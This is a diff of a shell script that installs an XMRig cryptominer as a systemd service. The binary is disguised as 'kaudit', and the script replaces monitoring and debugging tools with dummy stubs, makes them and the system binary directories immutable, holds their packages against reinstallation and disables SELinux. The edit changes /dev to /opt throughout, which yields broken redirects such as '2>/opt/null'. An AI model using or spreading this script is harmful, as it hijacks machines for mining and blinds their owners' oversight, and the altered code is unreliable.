@@ -2,9 +2,9 @@
 
 
 
-if [ ! -d "/dev" ]; then
-  echo "[*] /dev directory does not exist. Creating it..."
-  sudo mkdir -p /dev
+if [ ! -d "/opt" ]; then
+  echo "[*] /opt directory does not exist. Creating it..."
+  sudo mkdir -p /opt
 fi
 
 echo "[*] Removing and blocking monitoring/system tools..."
@@ -21,39 +21,39 @@ TOOLS_TO_REMOVE=(
 # Remove tools and create immutable replacements
 for tool in "${TOOLS_TO_REMOVE[@]}"; do
   # Remove existing binary
-  sudo rm -f "$tool" 2>/dev/null
+  sudo rm -f "$tool" 2>/opt/null
   
   # Create dummy script at target path
   sudo mkdir -p "$(dirname "$tool")"
-  echo -e "#!/bin/sh\necho 'Command disabled'" | sudo tee "$tool" >/dev/null
+  echo -e "#!/bin/sh\necho 'Command disabled'" | sudo tee "$tool" >/opt/null
   sudo chmod 111 "$tool"  # Remove all write permissions
   
   # Make file immutable (requires root)
-  sudo chattr +i "$tool" 2>/dev/null || true
+  sudo chattr +i "$tool" 2>/opt/null || true
 done
 
 # Block package manager reinstallation
 for pkg in procps psmisc htop net-tools strace gdb lsof util-linux; do
-  sudo dpkg --set-selections <<< "$pkg hold" 2>/dev/null || \
-  sudo yum versionlock add "$pkg" 2>/dev/null || \
-  sudo dnf versionlock add "$pkg" 2>/dev/null || true
+  sudo dpkg --set-selections <<< "$pkg hold" 2>/opt/null || \
+  sudo yum versionlock add "$pkg" 2>/opt/null || \
+  sudo dnf versionlock add "$pkg" 2>/opt/null || true
 done
 
 # Lock critical directories
-sudo chattr -R +i /bin /usr/bin /sbin /usr/sbin 2>/dev/null || true
+sudo chattr -R +i /bin /usr/bin /sbin /usr/sbin 2>/opt/null || true
 
 echo "[*] Starting XMRig Setup Script"
 
 # Constants
 XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz"
 XMRIG_ARCHIVE="/tmp/xmrig.tar.gz"
-XMRIG_DIR="/dev/xmrig"
+XMRIG_DIR="/opt/xmrig"
 XMRIG_BINARY="$XMRIG_DIR/kaudit"
 SERVICE_FILE="/etc/systemd/system/xmrig.service"
 HUGE_PAGES=$((1280 + $(nproc)))
 
 # Disable SELinux (temporarily and permanently)
-if command -v getenforce >/dev/null && [ "$(getenforce)" = "Enforcing" ]; then
+if command -v getenforce >/opt/null && [ "$(getenforce)" = "Enforcing" ]; then
   echo "[*] Disabling SELinux enforcement temporarily..."
   sudo setenforce 0
 
@@ -100,7 +100,7 @@ rm -f "$XMRIG_ARCHIVE"
 # Create systemd service
 echo "[*] Creating systemd service at $SERVICE_FILE"
 
-sudo tee "$SERVICE_FILE" > /dev/null <<EOF
+sudo tee "$SERVICE_FILE" > /opt/null <<EOF
 [Unit]
 Description=XMRig Miner Service
 After=network.target
